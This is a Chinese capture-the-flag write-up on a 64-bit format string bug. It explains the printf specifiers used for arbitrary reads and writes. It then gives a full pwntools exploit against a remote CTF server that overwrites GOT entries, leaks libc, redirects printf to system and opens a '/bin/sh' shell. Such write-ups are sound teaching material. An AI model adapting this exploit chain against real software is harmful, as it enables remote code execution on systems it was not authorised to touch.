# 格式化字符串
## 漏洞点

``` printf的汇编代码
.text:00000000004006E1                 lea     rdi, aInteresting ; "Interesting "
.text:00000000004006E8                 mov     eax, 0
.text:00000000004006ED                 call    _printf
.text:00000000004006F2                 lea     rax, [rbp+buf]
.text:00000000004006F9                 mov     rdi, rax        ; format  //很明显的格式化字符串漏洞
.text:00000000004006FC                 mov     eax, 0
.text:0000000000400701                 call    _printf
.text:0000000000400706                 lea     
```
如果不清楚，可以看其源码

```
unsigned __int64 sub_40069D()
{
  char buf; // [rsp+0h] [rbp-410h]
  unsigned __int64 v2; // [rsp+408h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("What do you mean this time? ");
  read(0, &buf, 0x400uLL);
  printf("Interesting ", &buf);
  printf(&buf);  //格式化字符串漏洞
  puts(" food for thought");
  return __readfsqword(0x28u) ^ v2;
}
```
## 利用漏洞点
1. 先说一下printf的格式化字符串：</br>
<ul>
  <li> %c：输出字符，配上%n可用于向指定地址写数据。</li>
  <li>%d：输出十进制整数，配上%n可用于向指定地址写数据。</li>
  <li>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</li>
  <li>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是   64bit。</li>
  <li>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</li>
  <li>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</li>
  <li>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</li>
</ul>

printf的参数是可变的，可以是一个，两个，或者没有。printf会根据内存顺序读取参数，如果有格式化字符，就顺序分析。</br>

2. __利用思路__:
<p>首先确定格式化字符串在栈中的偏移，这里想要一直利用格式化字符串的漏洞，就得让其“循环”起来，可以一直调用printf函数。这里修改函数中用的最多的函数put为main函数地址，可以多次利用printf的漏洞，通过%s来泄漏在printf前运行过的函数，这里通过泄漏read的地址来泄漏libc，从而得到system地址。最后修改printf的got地址为system地址，在程序调用printf时，实际上是调用的system函数，最后，send‘/bin/sh\x00’作为system的参数。</p>
<p>不能直接在命令行上输入\x78\x23\x34%6$s进行测试，因为程序会把上述命令解析为\,x,7,8单个的字节，所以不会出现我们想要的结果。</p>
## 利用脚本
这道题目的偏移量为6。</br>

```
from pwn import *
from LibcSearcher import LibcSearcher
r = remote("vps1.blue-whale.me",19904)
elf = ELF('./pwn1')
#context.log_level='debug'

//修改puts_got地址为main的地址，达到多次利用漏洞的效果
main_addr = 0x40069D
puts_got = elf.got['puts']
r.recvuntil("What do you mean this time? ")
payload = "a%" + str(main_addr-1) + "c%8$lln" + p64(puts_got)  //这里为什么不用hhn?因为地址中有\x00，由于64位下用户可见的内存地址高位都带有\x00，容易截断我们构造的内容，所以把地址放在后边。其实作用一样，地址放哪都一样。这里的8是因为a%..c和%8$lln占了两个参数，分别为第六和第七个参数。相对于printf为第7和第8个参数。
#print payload
r.sendline(payload)

//泄漏read地址
read_got = elf.got['read']
r.recvuntil("What do you mean this time? ")
payload = "AAAA%7$s" + p64(read_got) //AAAA%7$s占一个参数，为第六个参数
r.sendline(payload)
r.recvuntil("Interesting ")
read_addr=u64(r.recvuntil("\x30",drop=True)[4:].ljust(8,'\x00'))
print hex(read_addr)

//泄漏libc,得到system地址
libc = LibcSearcher("read",read_addr)
libcbase = read_addr-libc.dump('read') 
system_addr = libcbase +libc.dump('system')
print hex(system_addr)

//修改printf_got为system地址，由打印出的地址可以看出，除了最后三个字节，其他字节都一样，system地址分三次单字节写入即可。
printf_got = elf.got['printf']
print hex(printf_got)
first = system_addr & 0xff  //低字节
second = (system_addr>>8) & 0xff //倒数第二个字节
third = (system_addr>>16) & 0xff //最后一个字节
payload = "%" + str(first) + "c%11$hhn"   //这里的11，是前边格式化字符串占了参数的位置，即顺序后延，格式化字符的第一个参数是在偏移11的位置，n是把输出字符的个数写入相应位置，把低字节\x..转为十进制的字符串，c表示字符个数，%123c表示123个字符串，在写入内存时，又以十六进制的形式写入，即把低字节\x..写入
payload += "%" + str(256-first+second) + "c%12$hhn"  //这里为什么用256减，因为要想把第二个字节写入，得需要减去第一个字节的个数，有可能第二个字节小于第一个字节，相减得到负数就会出错，这里向高位借1，即0x100=256,相当于取模。比如0x550423,第二个字节为0x04,而第一个字节为0x23,0x100+0x04-0x23=0xE1,实际写入的是0xE1+0x23=0x104,但是是单字节写入，会把高位给移出，还是写入的0x04。
payload += "%" + str(256-second+third) + "c%13$hhn"
payload += 'AAAA' //剩下的字节随便填充即可

if len(str(first))<3: //这里保证写入的地址为8的整数倍
    payload += 'A'
if len(str(256-first+second))<3:
    payload += 'A'
if len(str(256-first+third))<3:
    payload += 'A'
payload += p64(printf_got)
payload += p64(printf_got + 1)
payload += p64(printf_got + 2)

r.sendline(payload)

r.sendline("/bin/sh\x00") //printf("/bin/sh")-->system("/bin/sh")

r.interactive()

```

## 参考文章：
http://www.sohu.com/a/130725162_472906 </br>
https://www.cnblogs.com/ichunqiu/p/9329387.html
